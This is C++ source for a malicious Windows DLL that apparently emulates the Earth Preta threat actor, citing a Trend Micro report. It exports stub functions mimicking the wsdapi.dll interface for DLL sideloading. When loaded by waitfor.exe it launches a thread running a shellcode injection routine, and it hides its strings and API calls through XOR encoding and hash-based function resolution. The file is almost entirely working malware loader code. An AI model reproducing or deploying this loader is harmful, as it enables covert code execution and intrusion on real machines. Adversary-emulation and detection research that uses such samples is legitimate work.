#include "handler.hpp"
#include "handler_util.hpp"

// Returns true if the loading process is waitfor.exe, false otherwise.
BOOL InWaitforProcess() {
    GetModuleFileNameW_t fp_GetModuleFileNameW = RESOLVE_FN_FNV1A(XorStringW(L"Kernel32.dll"), GetModuleFileNameW);
    if (!fp_GetModuleFileNameW) {
        return FALSE;
    }

    wchar_t buf[MAX_PATH];
    DWORD result = fp_GetModuleFileNameW(NULL, buf, MAX_PATH);
    if (!result) {
        return FALSE;
    }

    return _wcsicmp(buf, XorStringW(L"C:\\Windows\\System32\\waitfor.exe")) == 0;
}

/*
 * DllMain:
 *      About:
 *          If loaded by waitfor.exe, will create a thread to run the shellcode
 *          payload injection routine. Otherwise, simply returns.
 *      CTI:
 *          https://www.trendmicro.com/en_us/research/25/b/earth-preta-mixes-legitimate-and-malicious-components-to-sidestep-detection.html
 */
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    switch(fdwReason) {
        case DLL_PROCESS_ATTACH:
            if (InWaitforProcess()) {
                CreateThread_t fp_CreateThread = RESOLVE_FN_FNV1A(XorStringW(L"Kernel32.dll"), CreateThread);
                if (!fp_CreateThread) {
                    return FALSE;
                }

                HANDLE h_thread = fp_CreateThread(
                    NULL,
                    0,
                    (LPTHREAD_START_ROUTINE)RunPayload,
                    NULL,
                    0,
                    NULL
                );
                if (h_thread == NULL) {
                    return FALSE;
                }
            }
            break;

        case DLL_THREAD_ATTACH:
            break;

        case DLL_THREAD_DETACH:
            break;

        case DLL_PROCESS_DETACH:
            break;
    }
    return TRUE;
}

// https://github.com/tpn/winsdk-10/blob/master/Include/10.0.16299.0/um/Wsdutil.h
__declspec(dllexport) HRESULT WINAPI
WSDSetConfigurationOption(DWORD dwOption, _In_reads_bytes_(cbInBuffer) LPVOID pVoid, DWORD cbInBuffer) {
    Handler();
    return 0;
}

// https://github.com/tpn/winsdk-10/blob/master/Include/10.0.16299.0/um/Wsdxml.h
__declspec(dllexport) HRESULT WINAPI
WSDXMLCreateContext(_Outptr_ void** ppContext) {
    Handler();
    return 0;
}

// https://github.com/tpn/winsdk-10/blob/9b69fd26ac0c7d0b83d378dba01080e93349c2ed/Include/10.0.16299.0/um/Wsdutil.h
__declspec(dllexport) void WINAPI
WSDFreeLinkedMemory(void *pVoid) {
    Handler();
}

// https://github.com/tpn/winsdk-10/blob/9b69fd26ac0c7d0b83d378dba01080e93349c2ed/Include/10.0.16299.0/um/Wsddisco.h
__declspec(dllexport) HRESULT WINAPI
WSDCreateDiscoveryPublisher(void* pContext, _Outptr_ void** ppPublisher) {
    Handler();
    return 0;
}

// https://github.com/tpn/winsdk-10/blob/9b69fd26ac0c7d0b83d378dba01080e93349c2ed/Include/10.0.16299.0/um/Wsdutil.h
__declspec(dllexport) void WINAPI
WSDAttachLinkedMemory(void* pParent, void* pChild) {
    Handler();
}

// https://github.com/tpn/winsdk-10/blob/9b69fd26ac0c7d0b83d378dba01080e93349c2ed/Include/10.0.16299.0/um/Wsdhost.h
__declspec(dllexport) HRESULT WINAPI
WSDCreateDeviceHost(
    _In_ LPCWSTR pszLocalId,
    void* pContext,
    _Outptr_ void** ppDeviceHost) {
    Handler();
    return 0;
}

// https://github.com/tpn/winsdk-10/blob/9b69fd26ac0c7d0b83d378dba01080e93349c2ed/Include/10.0.16299.0/um/Wsdutil.h
__declspec(dllexport) void * WINAPI
WSDAllocateLinkedMemory(void* pParent, size_t cbSize) {
    Handler();
    return NULL;
}

// https://github.com/tpn/winsdk-10/blob/9b69fd26ac0c7d0b83d378dba01080e93349c2ed/Include/10.0.16299.0/um/Wsdhost.h
__declspec(dllexport) HRESULT WINAPI
WSDCreateDeviceHostAdvanced(
    _In_ LPCWSTR pszLocalId,
    void* pContext,
    _In_reads_opt_(dwHostAddressCount) void** ppHostAddresses,
    DWORD dwHostAddressCount,
    _Outptr_ void** ppDeviceHost)
{
    Handler();
    return 0;
}

// https://github.com/tpn/winsdk-10/blob/9b69fd26ac0c7d0b83d378dba01080e93349c2ed/Include/10.0.16299.0/um/Wsdbase.h
__declspec(dllexport) HRESULT WINAPI
WSDCreateHttpAddress(_Outptr_ void** ppAddress) {
    Handler();
    return 0;
}
